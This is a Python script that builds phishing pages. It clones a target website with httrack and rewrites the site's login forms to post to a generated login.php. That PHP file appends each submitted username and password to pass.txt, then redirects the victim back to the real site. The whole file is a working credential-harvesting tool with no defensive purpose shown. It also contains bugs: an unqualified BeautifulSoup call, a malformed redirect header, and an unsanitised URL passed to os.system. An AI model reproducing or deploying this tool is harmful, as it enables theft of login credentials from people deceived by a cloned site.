import os
import bs4
import time

class PHPBuilder():
	def __init__(self):
		...

	def building(self, url):
		link = url
		for i in (('http:', ''), ('https:', ''), ('//', '')):
			link = link.replace(*i)
		link = link.split('/')[0]
		dirlink = link + '/' + link
		os.system('mkdir ht/' + link + ' && cd ht/' + link + ' && httrack ' + url + ' -r2')
		while 'httrack' in os.popen('ps').read():
			time.sleep(2)

		

		with open('ht/' + dirlink + '/index.html', 'r+', encoding='utf-8', errors='ignore') as f:
			data_line = f.readlines()
			f.close()
		with open('ht/' + dirlink + '/index.html', 'r+', encoding='utf-8', errors='ignore') as f:
			data = f.read()
			f.close()

		print(data_line)
		print(data)

		soup = BeautifulSoup(data, 'html.parser')
		forms = soup.findAll('form')


		forms1 = []
		for line in data_line:
			if '<form' in line:
				forms1.append(line.split('>')[0] + '>')
			else:
				pass


		results = []
		names = []
		clearing = []
		forms_change = []
		forms_change2 = []
		actions = []
		methods = []
		total = []

		for i in forms:
			soup = BeautifulSoup(str(i), 'html.parser')
			inputs = soup.findAll('input', {'type': 'text'})
		
			results.append(inputs)

		for i in forms:
			soup = BeautifulSoup(str(i), 'html.parser')
			inputs = soup.findAll('input', {'type': 'password'})
		
			results.append(inputs)

		for i in results:
			soup = BeautifulSoup(str(i), 'html.parser')
			names.append(soup.find('input').attrs)

		tmp = 0
		for i in names:
			clearing.append(names[tmp]['name'])
			tmp += 1
		clearing = sorted(set(clearing), key=lambda d: clearing.index(d))


		for i in forms1:
			soup = BeautifulSoup(str(i), 'html.parser')
			try:
				tmp = soup.find('form').attrs
				actions.append(tmp['action'])
				methods.append(tmp['method'])
			except:
				pass
		print(forms1)
		tmp = 0
		for i in forms1:
			i = i.replace(methods[tmp], 'POST')
			forms_change2.append(i.replace(actions[tmp], "login.php"))
			tmp += 1
		print(forms_change2, 2)

		file = open('ht/' + dirlink + '/index.php', 'w')

		for line in data_line:
			tmp = 0
			for i in forms1:
				line = line.replace(str(forms1[tmp]), str(forms_change2[tmp]))
				tmp += 1
			file.write(line)
			


		file.close()

		op = input()


		file = open('ht/' + dirlink + '/login.php', 'w')
		login_form = '<?php file_put_contents("pass.txt",  '
		for i in clearing:
			login_form += '$_POST["' + str(i) + '"].":".'
		login_form = login_form[:-4] + '"\\n", FILE_APPEND);\n'
		login_form += 'header("' + url + '");\nexit();'

		file.write(login_form)
		file.close()

		main_ht = open('ht/' + link + '/index.html', 'r').readlines()
		file = open('ht/' + link + '/index.html', 'w')
		for i in main_ht:
			file.write(i.replace(link + '/index.html', link + '/index.php'))
		file.close()

